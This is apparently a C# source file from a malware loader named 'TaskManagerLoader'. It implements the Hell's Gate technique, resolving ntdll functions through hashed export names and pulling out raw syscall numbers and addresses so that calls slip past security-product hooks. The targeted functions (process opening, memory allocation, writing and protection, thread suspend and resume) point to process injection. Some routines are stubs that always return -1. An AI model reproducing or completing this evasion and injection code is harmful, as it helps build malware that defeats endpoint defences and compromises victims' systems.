using System;
using System.Runtime.InteropServices;
using System.Text;

namespace TaskManagerLoader
{
    public static class HellGate
    {
        private static IntPtr sysAddrJmp = IntPtr.Zero;
        private static ushort wSystemCall = 0;

        public static ulong djb2(byte[] data)
        {
            ulong hash = 0x7114953477341234;
            foreach (byte b in data)
            {
                if (b == 0) break;
                hash = ((hash << 2) + hash) + b;
            }
            return hash;
        }

        public static bool GetImageExportDirectory(IntPtr moduleBase, out IntPtr pImageExportDirectory)
        {
            pImageExportDirectory = IntPtr.Zero;

            try
            {
                if (moduleBase == IntPtr.Zero)
                    return false;

                ushort dosSignature = (ushort)Marshal.ReadInt16(moduleBase);
                if (dosSignature != NativeConstants.IMAGE_DOS_SIGNATURE)
                    return false;

                int e_lfanew = Marshal.ReadInt32(IntPtr.Add(moduleBase, 0x3C));
                if (e_lfanew <= 0 || e_lfanew > 0x100000)
                    return false;

                IntPtr ntHeadersPtr = IntPtr.Add(moduleBase, e_lfanew);
                if (ntHeadersPtr == IntPtr.Zero)
                    return false;

                int signature = Marshal.ReadInt32(ntHeadersPtr);
                if (signature != NativeConstants.IMAGE_NT_SIGNATURE)
                    return false;

                IntPtr optionalHeaderPtr = IntPtr.Add(ntHeadersPtr, 24);
                if (optionalHeaderPtr == IntPtr.Zero)
                    return false;
                
                IntPtr dataDirectoryPtr = IntPtr.Add(optionalHeaderPtr, 112);
                if (dataDirectoryPtr == IntPtr.Zero)
                    return false;

                uint exportDirRVA = (uint)Marshal.ReadInt32(dataDirectoryPtr);
                if (exportDirRVA == 0 || exportDirRVA > 0x10000000)
                    return false;

                pImageExportDirectory = IntPtr.Add(moduleBase, (int)exportDirRVA);
                if (pImageExportDirectory == IntPtr.Zero)
                    return false;

                return true;
            }
            catch
            {
                pImageExportDirectory = IntPtr.Zero;
                return false;
            }
        }

        public static bool GetVxTableEntry(IntPtr moduleBase, IntPtr pImageExportDirectory, ref VX_TABLE_ENTRY vxEntry)
        {
            try
            {
                uint characteristics = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x00));
                uint timeDateStamp = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x04));
                ushort majorVersion = (ushort)Marshal.ReadInt16(IntPtr.Add(pImageExportDirectory, 0x08));
                ushort minorVersion = (ushort)Marshal.ReadInt16(IntPtr.Add(pImageExportDirectory, 0x0A));
                uint name = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x0C));
                uint base_ = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x10));
                uint numberOfFunctions = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x14));
                uint numberOfNames = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x18));
                uint addressOfFunctions = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x1C));
                uint addressOfNames = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x20));
                uint addressOfNameOrdinals = (uint)Marshal.ReadInt32(IntPtr.Add(pImageExportDirectory, 0x24));

                if (numberOfNames == 0 || numberOfNames > 0x10000)
                    return false;

                if (addressOfFunctions == 0 || addressOfNames == 0 || addressOfNameOrdinals == 0)
                    return false;

                IntPtr addressOfFunctionsPtr = IntPtr.Add(moduleBase, (int)addressOfFunctions);
                IntPtr addressOfNamesPtr = IntPtr.Add(moduleBase, (int)addressOfNames);
                IntPtr addressOfNameOrdinalsPtr = IntPtr.Add(moduleBase, (int)addressOfNameOrdinals);

                if (addressOfFunctionsPtr == IntPtr.Zero || addressOfNamesPtr == IntPtr.Zero || addressOfNameOrdinalsPtr == IntPtr.Zero)
                    return false;

                for (int i = 0; i < numberOfNames && i < 0x10000; i++)
                {
                    try
                    {
                        IntPtr nameRvaPtr = IntPtr.Add(addressOfNamesPtr, i * 4);
                        if (nameRvaPtr == IntPtr.Zero)
                            continue;

                        uint nameRVA = (uint)Marshal.ReadInt32(nameRvaPtr);
                        if (nameRVA == 0 || nameRVA > 0x10000000)
                            continue;

                        IntPtr namePtr = IntPtr.Add(moduleBase, (int)nameRVA);
                        if (namePtr == IntPtr.Zero)
                            continue;

                        byte[] nameBytes = new byte[256];
                        int j = 0;
                        while (j < 255)
                        {
                            try
                            {
                                byte b = Marshal.ReadByte(IntPtr.Add(namePtr, j));
                                if (b == 0) break;
                                nameBytes[j] = b;
                                j++;
                            }
                            catch
                            {
                                break;
                            }
                        }
                        nameBytes[j] = 0;

                        ulong nameHash = djb2(nameBytes);
                        
                        if (nameHash == vxEntry.dwHash)
                        {
                            try
                            {
                                IntPtr ordinalPtr = IntPtr.Add(addressOfNameOrdinalsPtr, i * 2);
                                if (ordinalPtr == IntPtr.Zero)
                                    continue;

                                ushort ordinal = (ushort)Marshal.ReadInt16(ordinalPtr);
                                if (ordinal >= numberOfFunctions)
                                    continue;

                                IntPtr funcRvaPtr = IntPtr.Add(addressOfFunctionsPtr, ordinal * 4);
                                if (funcRvaPtr == IntPtr.Zero)
                                    continue;

                                uint funcRVA = (uint)Marshal.ReadInt32(funcRvaPtr);
                                if (funcRVA == 0 || funcRVA > 0x10000000)
                                    continue;

                                IntPtr funcAddress = IntPtr.Add(moduleBase, (int)funcRVA);
                                if (funcAddress == IntPtr.Zero)
                                    continue;

                                vxEntry.pAddress = funcAddress;
                                
                                int offset = 0;
                                while (offset < 200)
                                {
                                    try
                                    {
                                        byte b1 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset));
                                        byte b2 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 1));
                                        byte b3 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 2));
                                        byte b4 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 3));
                                        byte b5 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 4));
                                        byte b6 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 5));
                                        byte b7 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 6));
                                        byte b8 = Marshal.ReadByte(IntPtr.Add(funcAddress, offset + 7));

                                        if (b1 == 0x4C && b2 == 0x8B && b3 == 0xD1 && b4 == 0xB8 && b7 == 0x00 && b8 == 0x00)
                                        {
                                            ushort syscallNum = (ushort)((b6 << 8) | b5);
                                            vxEntry.wSystemCall = syscallNum;
                                            
                                            int syscallOffset = offset + 8;
                                            while (syscallOffset < offset + 50)
                                            {
                                                try
                                                {
                                                    byte s1 = Marshal.ReadByte(IntPtr.Add(funcAddress, syscallOffset));
                                                    byte s2 = Marshal.ReadByte(IntPtr.Add(funcAddress, syscallOffset + 1));
                                                    
                                                    if (s1 == 0x0F && s2 == 0x05)
                                                    {
                                                        vxEntry.upSysAddress = IntPtr.Add(funcAddress, syscallOffset);
                                                        return true;
                                                    }
                                                    
                                                    syscallOffset++;
                                                }
                                                catch
                                                {
                                                    break;
                                                }
                                            }
                                            
                                            vxEntry.upSysAddress = IntPtr.Add(funcAddress, offset + 0x12);
                                            return true;
                                        }

                                        if ((b1 == 0x0F && b2 == 0x05) || b1 == 0xC3)
                                        {
                                            if (offset == 0)
                                                return false;
                                            return false;
                                        }

                                        offset++;
                                    }
                                    catch
                                    {
                                        break;
                                    }
                                }
                            }
                            catch
                            {
                                continue;
                            }
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch
            {
                return false;
            }

            return false;
        }

        public static void HellsGate(ushort syscallNum)
        {
            wSystemCall = syscallNum;
        }

        [DllImport("kernel32.dll")]
        private static extern void SwitchToThread();

        public static int HellDescent(params object[] parameters)
        {
            if (sysAddrJmp == IntPtr.Zero || wSystemCall == 0)
                return -1;

            return -1;
        }

        public static bool InitializeVxTable(out VX_TABLE vxTable)
        {
            vxTable = new VX_TABLE();

            try
            {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero)
                    return false;

                if (!GetImageExportDirectory(hNtdll, out IntPtr pImageExportDirectory))
                    return false;

                string[] functions = {
                    "NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
                    "NtProtectVirtualMemory", "NtOpenThread", "NtSuspendThread",
                    "NtResumeThread", "NtQuerySystemInformation", "NtDuplicateObject",
                    "NtQueryInformationThread", "NtQueryInformationProcess"
                };

                VX_TABLE_ENTRY[] entries = new VX_TABLE_ENTRY[functions.Length];
                for (int i = 0; i < entries.Length; i++)
                {
                    entries[i] = new VX_TABLE_ENTRY();
                }

                for (int i = 0; i < functions.Length; i++)
                {
                    byte[] funcBytes = Encoding.ASCII.GetBytes(functions[i]);
                    entries[i].dwHash = djb2(funcBytes);

                    if (!GetVxTableEntry(hNtdll, pImageExportDirectory, ref entries[i]))
                        return false;
                }

                vxTable.NtOpenProcess = entries[0];
                vxTable.NtAllocateVirtualMemory = entries[1];
                vxTable.NtWriteVirtualMemory = entries[2];
                vxTable.NtProtectVirtualMemory = entries[3];
                vxTable.NtOpenThread = entries[4];
                vxTable.NtSuspendThread = entries[5];
                vxTable.NtResumeThread = entries[6];
                vxTable.NtQuerySystemInformation = entries[7];
                vxTable.NtDuplicateObject = entries[8];
                vxTable.NtQueryInformationThread = entries[9];
                vxTable.NtQueryInformationProcess = entries[10];

                return true;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}

